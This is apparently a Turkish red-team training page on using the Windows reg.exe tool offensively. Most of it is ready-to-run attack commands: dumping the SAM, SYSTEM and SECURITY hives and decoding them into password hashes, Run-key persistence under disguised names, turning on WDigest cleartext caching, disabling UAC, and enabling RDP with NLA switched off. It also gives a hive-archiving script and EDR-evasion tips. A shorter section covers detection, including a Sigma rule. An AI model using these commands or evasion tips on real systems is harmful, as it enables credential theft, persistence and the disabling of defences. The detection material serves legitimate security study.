# reg.exe

> **Kategori:** [2. WINDOWS YEREL KOMUT SATIRI VE LOLBINS (NATIVE WINDOWS & SYSINTERNALS)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows Kayıt Defteri CLI yönetim LOLBin aracı; kilitli kovanları yedekleme (`reg save SAM/SYSTEM/SECURITY`), kalıcılık anahtarları oluşturma (`reg add Run`), savunma kör etme ve sistem yapılandırması sorgulama (`reg query`).

---

## 1. Genel Bakış ve Amaç

`reg.exe`, Windows NT'den bu yana tüm Windows işletim sistemlerinde varsayılan olarak (`C:\Windows\System32\reg.exe`) bulunan ve **Windows Kayıt Defteri (Windows Registry)** veritabanını komut satırından sorgulamak, değiştirmek, dışa aktarmak ve kovanları (hives) diske kaydetmek için tasarlanmış en güçlü yerleşik LOLBin araçlarından biridir.

Windows kayıt defteri, işletim sisteminin çekirdek ayarlarını, donanım sürücülerini, güvenlik politikalarını, yüklü yazılımları ve kullanıcı profillerini barındıran merkezi hiyerarşik bir veritabanıdır. Ancak Red Team ve sızma testi operasyonlarında `reg.exe`, özellikle üç kritik operasyonel senaryo için vazgeçilmezdir:
1. **Çevrimdışı Kimlik Bilgisi Çalma (Offline Credential Dumping - T1003.002):** İşletim sistemi çalışırken çekirdek tarafından kilitlenen `SAM`, `SYSTEM` ve `SECURITY` kovanlarını `reg save` komutuyla kopyalayarak yerel NTLM hash'lerini, SysKey'i ve LSA Secrets (DPAPI Master Keys, servis parolaları) verilerini elde etmek.
2. **Kalıcılık Sağlama (Persistence - T1547.001):** `Run`, `RunOnce`, `Winlogon`, `Image File Execution Options (IFEO)` gibi sistem başlangıç anahtarlarına zararlı ikili dosya veya komut dizgileri enjekte etmek.
3. **Savunma Mekanizmalarını Kör Etme (Defense Evasion - T1562.001):** UAC (`EnableLUA`), WDigest açık metin parola önbelleklemesi (`UseLogonCredential`), Uzak Masaüstü kısıtlamaları (`fDenyTSConnections`) ve Windows Defender korumalarını kayıt defterinden manipüle etmek.

### Protokol ve Çalışma Prensibi

`reg.exe`, Windows çekirdeğinde (Kernel) bulunan Configuration Manager alt sistemi ve Win32 Registry API'leri (`RegSaveKeyW`, `RegQueryValueExW`, `RegSetValueExW`) üzerinden çalışır:

```
┌──────────────────────────────────────────────────────────────┐
│                    Kullanıcı Komut Kabuğu                    │
│                        [ reg.exe ]                           │
└──────────────────────────────┬───────────────────────────────┘
                               │
               1. Win32 API: RegOpenKeyExW(...)                
               2. Çekirdek API: NtSaveKeyEx(...) / SeBackup    
                               │
                               ▼
┌──────────────────────────────────────────────────────────────┐
│                  Windows Configuration Manager               │
│                  [ Çekirdek Kayıt Defteri ]                  │
│                                                              │
│  - HKLM\SAM      (C:\Windows\System32\config\SAM)            │
│  - HKLM\SYSTEM   (C:\Windows\System32\config\SYSTEM)         │
│  - HKLM\SECURITY (C:\Windows\System32\config\SECURITY)       │
│  - HKLM\SOFTWARE (C:\Windows\System32\config\SOFTWARE)       │
└──────────────────────────────┬───────────────────────────────┘
                               │
         (A) reg save Mekanizması:
         Normalde işletim sistemi tarafından kilitli (Exclusive Lock) 
         olan dosyaların tutarlı bir anlık kopyası (snapshot) alınır.
                               ▼
┌──────────────────────────────────────────────────────────────┐
│                 Diske Kaydedilen Kovanlar                    │
│   sam.hive       -> Yerel NTLM Hash'leri (Administrator vb.) │
│   system.hive    -> BootKey / SysKey (SAM & LSA şifre anahtarı)
│   security.hive  -> LSA Secrets & Önbelleğe Alınan Etki Alanı │
│                     Kimlikleri (DCC2 / mscache2)             │
└──────────────────────────────────────────────────────────────┘
```

1. **Kilitli Kovan Kopyalama (`reg save`):** Çalışan bir Windows makinesinde `C:\Windows\System32\config\SAM` dosyası LSASS ve çekirdek tarafından kilitlidir; `copy` veya `robocopy` ile okunamaz. Ancak `reg save HKLM\SAM <dosya>`, sürece atanmış `SeBackupPrivilege` ayrıcalığını kullanarak çekirdek düzeyinde kovanın o anki durumunu temiz bir dosya olarak diske yazar.
2. **SysKey ve Hash Çözümleme Mantığı:** `SAM` kovanındaki kullanıcı parolalarının NTLM hash'leri doğrudan okunamaz; SysKey ile RC4/AES algoritmalarıyla şifrelenmiştir. Bu nedenle saldırgan her zaman `SAM` ve `SYSTEM` kovanlarını **birlikte** çalmalıdır. `SYSTEM` kovanı içindeki `JD`, `Skew1`, `GBG`, `Data` anahtarlarından SysKey çıkarılır ve `SAM` içindeki NT hash'leri açık hale getirilir.
3. **LSA Secrets ve DCC2:** `SECURITY` kovanı, makinede daha önce oturum açmış etki alanı kullanıcılarının önbellek hash'lerini (`mscache2 / DCC2`), servis hesaplarının açık parolalarını ve DPAPI Sistem anahtarlarını barındırır.

### Neden Önemli?

| Kullanım Senaryosu | Açıklama |
|---|---|
| **Yerel Hash Hırsızlığı (SAM Dump)** | Yerel `Administrator` ve diğer yerel hesapların NTLM hash'lerini çevrimdışı kırma veya Pass-the-Hash için çalma. |
| **LSA Secrets Çalma** | Makinede çalışan servis hesaplarının açık parolalarını ve SCCM/VPN kimliklerini ele geçirme. |
| **RDP Servisini Zorla Açma** | Güvenlik duvarını ve kayıt defterini güncelleyerek hedef sistemde Uzak Masaüstü portunu (TCP 3389) aktif etme. |
| **WDigest İstismarı** | Windows'u sonraki oturum açmalarda bellekte açık metin (cleartext) parola saklamaya zorlama. |
| **Kalıcılık (Persistence)** | Makine her yeniden başladığında C2 ajanı çalıştırmak için `Run` kayıtları enjekte etme. |

### Alternatif Araçlarla Karşılaştırma

| Kriter / Yetenek | `reg.exe` | `PowerShell Registry Provider` | `secretsdump.py (Impacket)` | `Volume Shadow Copy (vssadmin)` |
|---|---|---|---|---|
| **Varsayılan Bulunabilirlik** | Tüm Windows sürümlerinde hazır | Windows PowerShell olan her yerde | Harici Linux aracı | Windows 7+ yerleşik |
| **Kovan Yedekleme (`save`)** | Var (`reg save`) | Yok (Doğrudan hive save desteklemez) | Ağ üzerinden (SMB/RPC) çeker | Dosya kopyalama ile alır |
| **Yetki Gereksinimi** | Local Admin / High Integrity | Local Admin (Yazma için) | Local Admin / SMB erişimi | Local Admin / High Integrity |
| **EDR Görünürlüğü** | `reg save SAM` doğrudan izlenir | Script Block Logging (EID 4104) | SMB ağ trafiği | Komut satırı izlenir |
| **Açık Parola Çözümleme** | Yapmaz (Yalnızca dosyayı döker) | Yapmaz | Doğrudan konsola hash'leri basar | Yapmaz |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

### Genel Sözdizimi

```cmd
reg <işlem> [anahtar_yolu] [seçenekler]
```

### Temel İşlemler (Sub-commands)

| İşlem | Açıklama | Örnek Kullanım |
|---|---|---|
| `query` | Belirtilen kayıt defteri anahtarını veya değerini görüntüler. | `reg query HKLM\Software\Policies /s` |
| `add` | Yeni bir anahtar veya değer ekler, mevcut olanı günceller. | `reg add HKLM\...\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f` |
| `delete` | Belirtilen anahtarı veya değeri siler. | `reg delete HKCU\Software\...\Run /v Updater /f` |
| `save` | Belirtilen kovanı (hive) ham ikili dosya olarak diske kaydeder. | `reg save HKLM\SAM C:\Temp\sam.hive /y` |
| `restore` | `save` ile alınan bir kovan dosyasını kayıt defterine geri yükler. | `reg restore HKLM\SAM C:\Temp\sam.hive` |
| `load` | Harici bir kovan dosyasını geçici bir anahtar altına bağlar. | `reg load HKLM\TempHive C:\Temp\other_sam.hive` |
| `unload` | `load` ile bağlanan kovanı sistemden ayırır. | `reg unload HKLM\TempHive` |
| `export` | Kayıt defteri anahtarını okunabilir `.reg` metin dosyası olarak çıkarır. | `reg export HKLM\Software\MyApp C:\Temp\app.reg /y` |
| `import` | `.reg` uzantılı bir dosyayı kayıt defterine geri aktarır. | `reg import C:\Temp\app.reg` |

### Kritik Parametre Bayrakları

| Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|
| `/v <DeğerAdı>` | İşlem yapılacak belirli değer adını (Value Name) belirtir. | `/v fDenyTSConnections` |
| `/ve` | Varsayılan (Default - Adsız) değeri hedefler. | `reg query HKLM\Software /ve` |
| `/s` | Belirtilen anahtarın altındaki tüm alt anahtarları rekürsif sorgular. | `reg query HKLM\System /s /f Password` |
| `/t <VeriTürü>` | Eklenecek değerin veri tipini belirler (`REG_SZ`, `REG_DWORD`, `REG_MULTI_SZ` vb.). | `/t REG_DWORD` |
| `/d <Veri>` | Anahtara yazılacak gerçek veriyi belirtir. | `/d 0` veya `/d "C:\Temp\agent.exe"` |
| `/f` | Onay istemeden zorla üzerine yazmayı (Force) sağlar. | `/f` |
| `/y` | `reg save` veya `reg export` komutlarında hedef dosya varsa üzerine yazar. | `/y` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: SAM, SYSTEM ve SECURITY Kovanlarını Kopyalama (Credential Dumping)

Saldırgan yerel yönetici ayrıcalıklarına sahip olduğunda yerel parola hash'lerini ve LSA sırlarını çalmak için şu 3 kovanı diske kaydeder:

```cmd
:: 1. SAM Kovanı (Kullanıcı NTLM Hash'leri)
reg save HKLM\SAM C:\Windows\Temp\sam.hive /y

:: 2. SYSTEM Kovanı (SysKey - Şifre Çözme Anahtarı)
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive /y

:: 3. SECURITY Kovanı (LSA Secrets, Cached Domain Credentials)
reg save HKLM\SECURITY C:\Windows\Temp\security.hive /y
```

**Kovanların Analizi (Saldırgan Makinesinde - Linux):**
Çalınan dosyalar saldırgan makinesine indirildikten sonra `impacket-secretsdump` ile çözülür:
```bash
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
```

**Örnek Çıktı:**
```text
[*] Target system bootKey: 0x9b4f2c1a8e3d7a...
[*] Dumping local SAM hashes...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
LAB.LOCAL/da_jdoe:$DCC2$10240$da_jdoe$c8a2b1...
[*] Dumping LSA Secrets...
$MACHINE.ACC: 0x8a1b2c...
```
- Yerel `Administrator` NT hash'i doğrudan ele geçirilir (`Pass-the-Hash` için kullanılabilir).
- `LAB.LOCAL/da_jdoe` kullanıcısının önbellek hash'i (DCC2) hashcat ile çevrimdışı kırılabilir.

---

### Senaryo 2: Uzak Masaüstü'nü (RDP) Kayıt Defterinden Zorla Etkinleştirme

Hedef sistemde RDP kapalıysa komut satırından kalıcı olarak açmak:

```cmd
:: 1. RDP Bağlantı Engellemesini Kaldır (fDenyTSConnections = 0)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

:: 2. Ağ Düzeyinde Kimlik Doğrulamayı (NLA) Kapat (İsteğe bağlı, kimliksiz bağlantı için)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

:: 3. Güvenlik Duvarında RDP Portuna (3389) İzin Ver
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

---

### Senaryo 3: Kalıcılık — Run Key Persistence (Kullanıcı Oturum Başlangıcı)

Kullanıcı her oturum açtığında saldırganın C2 payload'unun otomatik olarak çalışmasını sağlamak:

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSecurityUpdate" /t REG_SZ /d "C:\Users\Public\update.exe" /f
```

Tüm kullanıcılar (makine geneli) için kalıcılık:
```cmd
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemAudioService" /t REG_SZ /d "C:\Windows\Temp\svc.exe" /f
```

---

### Senaryo 4: Savunma Atlatma — WDigest Düz Metin Parola Önbelleklemeyi Açma

Windows 8.1 ve Server 2012 R2 öncesi davranışını zorlayarak kullanıcıların bir sonraki oturum açışında parolalarının LSASS belleğinde açık metin (cleartext) saklanmasını sağlamak:

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
```
- Bu komut girildikten sonra bir etki alanı yöneticisi makineye RDP veya konsoldan oturum açtığında, parolası belleğe düz metin yazılır ve Mimikatz `sekurlsa::wdigest` ile okunabilir!

---

### Senaryo 5: UAC'yi (Kullanıcı Hesabı Denetimi) Tamamen Devre Dışı Bırakma

Yerel yöneticilerin kısıtlı belirteç (Filtered Token) almasını engelleyerek her sürecin tam yönetici olarak başlamasını sağlamak:

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
```
*(Değişikliğin tam yürürlüğe girmesi için makinenin yeniden başlatılması gerekir).*

---

### Senaryo 6: Winlogon Kayıtlarından Açık Metin Parola Avı (AutoLogon)

Sistemde otomatik oturum açma yapılandırılmışsa açık parolayı çekmek:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

**Örnek Çıktı:**
```text
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    P@ssw0rd2026!Corporate
```

---

### Senaryo 7: PowerShell ile 3 Kovanı Otomatik Kaydedip Arşivleyen Betik

Operasyon sırasında tek tıkla kovanları alıp sıkıştıran operasyonel betik:

```powershell
# SAM, SYSTEM ve SECURITY kovanlarını geçici dizine kaydedip arşivleme:
$tempDir = "C:\Windows\Temp\hives_$((Get-Date).ToString('yyyyMMdd_HHmm'))"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

Write-Host "[*] Kovanlar kaydediliyor..." -ForegroundColor Cyan
reg save HKLM\SAM "$tempDir\sam.hive" /y | Out-Null
reg save HKLM\SYSTEM "$tempDir\system.hive" /y | Out-Null
reg save HKLM\SECURITY "$tempDir\security.hive" /y | Out-Null

Write-Host "[*] Kovanlar zip arşivine ekleniyor..." -ForegroundColor Green
Compress-Archive -Path "$tempDir\*.hive" -DestinationPath "$tempDir\hives.zip" -Force

# Temizlik: Ham hive dosyalarını sil
Remove-Item "$tempDir\*.hive" -Force
Write-Host "[+] Arşiv Hazır: $tempDir\hives.zip" -ForegroundColor Yellow
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı | Olası Neden | Çözüm Adımı |
|---|---|---|
| `ERROR: Access is denied.` | `reg save HKLM\SAM` veya `reg add HKLM\...` komutları yerel yönetici (Local Administrator / High Integrity) yetkisi gerektirir. | Komut istemcisini "Run as Administrator" olarak açın veya UAC Bypass uygulayın. |
| `ERROR: Overwrite file already exists.` | Hedef dosya yolunda daha önceden oluşturulmuş bir hive dosyası mevcuttur. | Komutun sonuna `/y` parametresi ekleyerek üzerine yazmayı zorlayın (`reg save HKLM\SAM sam.hive /y`). |
| `ERROR: The process cannot access the file because it is being used by another process.` | `reg.exe` yerine doğrudan dosya kopyalama (`copy`) komutu çalıştırılmıştır. | Kilitli dosyaları asla `copy` ile alamazsınız; mutlaka `reg save` veya Volume Shadow Copy (`vssadmin`) kullanın. |
| `ERROR: The system was unable to find the specified registry key or value.` | Sorgulanan anahtar veya değer mevcut değildir ya da yazım hatası yapılmıştır. | Üst anahtarı `reg query <Anahtar>` ile listeleyerek değer adının doğruluğunu teyit edin. |
| `ERROR: Error opening the subkey / Registry Hive corrupted.` | `reg save` çalışırken disk dolmuş veya sistem beklenmedik şekilde kesintiye uğramıştır. | Hedef sürücüdeki boş disk alanını kontrol edin ve işlemi tekrarlayın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Artifacts & Logs)

- **Uç Nokta Olay Günlükleri (Endpoint Logs):**
  - **Event ID 4688 / Sysmon Event ID 1 (Process Creation):** `reg.exe` çağrısı tüm argümanlarıyla (`save`, `HKLM\SAM`, `add`, `Run`) loglanır.
  - **Sysmon Event ID 11 (File Create):** Diske `sam.hive`, `system.hive` veya `.hive` uzantılı yeni dosyalar yazıldığında kaydedilir.
  - **Sysmon Event ID 12 / 13 (Registry Object Added or Value Set):** `reg add` ile bir kayıt defteri değeri değiştirildiğinde eski ve yeni değerle birlikte loglanır.
  - **Event ID 4657 (A registry value was modified):** Eğer Windows Gelişmiş Kayıt Defteri Denetimi (Registry Auditing) açıksa oluşturulur.

### 5.2 Ağ ve EDR İmzaları

- **Kritik EDR Alarmı (`reg save SAM`):** İstisnasız tüm kurumsal EDR çözümleri (CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne), komut satırında `reg.exe` sürecinin `save` argümanı ve ardından `HKLM\SAM`, `HKLM\SYSTEM` veya `HKLM\SECURITY` almasını **Critical Severity: OS Credential Dumping (T1003.002)** olarak algılar, süreci derhal öldürür (kill) ve uç noktayı ağdan izole eder.
- **Run Key Kalıcılık Alarmı:** `HKLM\...\Run` veya `HKCU\...\Run` anahtarına bilinmeyen veya geçici dizinlerdeki (`AppData`, `Temp`, `Public`) bir çalıştırılabilir dosya yolu eklenmesi davranışsal analiz kurallarınca anında engellenir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1003.002** | OS Credential Dumping: Security Account Manager | `reg save HKLM\SAM` ile yerel hash'leri çalma. |
| **T1003.004** | OS Credential Dumping: LSA Secrets | `reg save HKLM\SECURITY` ile LSA sırlarını ve önbellek kimliklerini çalma. |
| **T1547.001** | Boot or Logon Autostart Execution: Registry Run Keys | Kalıcılık için `Run` ve `RunOnce` anahtarlarına girdi ekleme. |
| **T1562.001** | Impair Defenses: Disable or Modify Tools | UAC veya Defender ilkelerini kayıt defterinden devre dışı bırakma. |
| **T1112** | Modify Registry | Sistemin konfigürasyonunu kayıt defteri üzerinden manipüle etme. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Alternatif Teknik |
|---|---|
| **`reg save SAM` Komut Satırı Engeli** | `reg.exe` komut satırını çağırmak yerine, **Volume Shadow Copy (VSS)** servisini kullanarak kilitli dosyaları gölge kopyadan çekin: `vssadmin create shadow /for=C:`. |
| **Belirgin Dosya İsimleri** | Kovanları kaydederken `sam.hive`, `sam.save` gibi isimler yerine masum görünen isimler kullanın: `reg save HKLM\SAM C:\Windows\Temp\ntuser.dat.bak /y`. |
| **Doğrudan Win32 API / Bellek İçi Çözüm** | C# veya PowerShell ile `NtSaveKeyEx` yerel API'sini bellek içinde dinamik olarak çağırın; böylece `reg.exe` süreci hiç başlamaz. |

### 5.5 Savunma Karşılığı (Blue Team)

- **Registry Auditing Politikası:** Hassas kayıt defteri anahtarlarına (`Run`, `Winlogon`, `WDigest`, `SAM`) yönelik yazma denetimini (Audit Success/Failure) açın.
- **Sigma Kuralı Mantığı:**
  ```yaml
  title: Registry Hive Dumping via Reg.exe
  status: critical
  logsource:
      category: process_creation
      product: windows
  detection:
      selection:
          Image|endswith: '\reg.exe'
          CommandLine|contains:
              - 'save'
          CommandLine|contains|any:
              - 'HKLM\SAM'
              - 'HKLM\SYSTEM'
              - 'HKLM\SECURITY'
              - 'hklm\sam'
              - 'hklm\system'
              - 'hklm\security'
      condition: selection
  ```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

### 6.1 SAM Kovanını Diske Kaydetme (Yerel Parola Hash'leri)
```cmd
reg save HKLM\SAM C:\Windows\Temp\sam.hive /y
```
- **Ne Yapar?** Yerel kullanıcıların NTLM hash'lerini barındıran kilitli SAM veritabanını diske kopyalar.
- **Ne Zaman Kullanılır?** Çevrimdışı parola kırma veya Pass-the-Hash saldırıları öncesinde.
- **Parametreler:** `save HKLM\SAM` (Hedef kovan), `/y` (Mevcut dosya varsa üzerine yazar).

### 6.2 SYSTEM Kovanını Diske Kaydetme (SysKey / BootKey)
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive /y
```
- **Ne Yapar?** SAM ve SECURITY kovanlarını şifreleyen anahtar olan SysKey'i barındıran SYSTEM kovanını kaydeder.
- **Ne Zaman Kullanılır?** SAM ve SECURITY kovanlarının şifresini çözebilmek için zorunlu olarak bunlarla birlikte alınır.
- **Parametreler:** `save HKLM\SYSTEM`, `/y`.

### 6.3 SECURITY Kovanını Diske Kaydetme (LSA Secrets & Cached Logons)
```cmd
reg save HKLM\SECURITY C:\Windows\Temp\security.hive /y
```
- **Ne Yapar?** LSA Secrets, servis hesabı açık parolaları ve önbelleğe alınmış etki alanı kimliklerini (DCC2) kaydeder.
- **Ne Zaman Kullanılır?** Etki alanı kullanıcılarının makinede kalan kimlik verilerini çalmak için.
- **Parametreler:** `save HKLM\SECURITY`, `/y`.

### 6.4 Uzak Masaüstü (RDP) Servisini Açma
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
- **Ne Yapar?** RDP bağlantı engellemesini kaldırarak sistemde Uzak Masaüstü dinleyicisini aktif hale getirir.
- **Ne Zaman Kullanılır?** Komut satırı erişiminden grafik arayüz (GUI) erişimine geçmek için.
- **Parametreler:** `/v fDenyTSConnections` (Değer adı), `/t REG_DWORD` (Tip), `/d 0` (0 = İzin ver), `/f` (Zorla).

### 6.5 Kalıcılık İçin Run Key Kaydı Ekleme
```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Users\Public\update.exe" /f
```
- **Ne Yapar?** Kullanıcı her oturum açtığında belirtilen yürütülebilir dosyanın arka planda başlamasını sağlar.
- **Ne Zaman Kullanılır?** Kullanıcı bağlamında kalıcılık (persistence) elde etmek için.
- **Parametreler:** `/v Updater` (Kayıt adı), `/d "..."` (Çalıştırılacak dosya yolu).

### 6.6 WDigest Düz Metin Parola Yakalamayı Açma
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
```
- **Ne Yapar?** Kullanıcıların sonraki oturum açışlarında açık metin parolalarının LSASS belleğinde saklanmasını sağlar.
- **Ne Zaman Kullanılır?** Bir yöneticinin makineye oturum açmasını bekleyip parolasını düz metin olarak yakalamak için.
- **Parametreler:** `/v UseLogonCredential`, `/d 1` (1 = Etkinleştir).

### 6.7 Otomatik Oturum Açma (AutoLogon) Parolalarını Sorgulama
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```
- **Ne Yapar?** Sistemde açık metin olarak kaydedilmiş Windows otomatik oturum açma parolasını sorgular.
- **Ne Zaman Kullanılır?** Kiosk veya sunucu makinelerinde unutulmuş sabit kodlu yönetici parolalarını bulmak için.
- **Parametreler:** `/v DefaultPassword`.

### 6.8 UAC'yi (Kullanıcı Hesabı Denetimini) Kapatma
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
```
- **Ne Yapar?** UAC filtresini tamamen devre dışı bırakır; tüm yöneticiler kısıtlamasız çalışır.
- **Ne Zaman Kullanılır?** Sistemde kalıcı serbest dolaşım sağlamak ve UAC pencerelerini engellemek için.
- **Parametreler:** `/v EnableLUA`, `/d 0`.

### 6.9 Bir Anahtarın Altındaki Tüm Değerleri Rekürsif Arama
```cmd
reg query "HKLM\Software\Policies" /s
```
- **Ne Yapar?** Belirtilen anahtarın altındaki tüm alt dalları ve değerleri konsola listeler.
- **Ne Zaman Kullanılır?** Merkezi Grup İlkeleri tarafından kayıt defterine yazılan kısıtlamaları incelemek için.
- **Parametreler:** `/s` (Rekürsif alt anahtar taraması).

---

## Kaynaklar

| Kaynak | Bağlantı |
|---|---|
| Microsoft Learn — reg command reference | [learn.microsoft.com](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg) |
| MITRE ATT&CK T1003.002 (OS Credential Dumping: SAM) | [attack.mitre.org](https://attack.mitre.org/techniques/T1003/002/) |
| MITRE ATT&CK T1547.001 (Registry Run Keys / Startup Folder) | [attack.mitre.org](https://attack.mitre.org/techniques/T1547/001/) |
| LOLBAS Project — reg.exe | [lolbas-project.github.io](https://lolbas-project.github.io/) |

---

> **Önceki:** [← gpresult](./gpresult.md) · **Sonraki:** [sc.exe →](./sc.md)
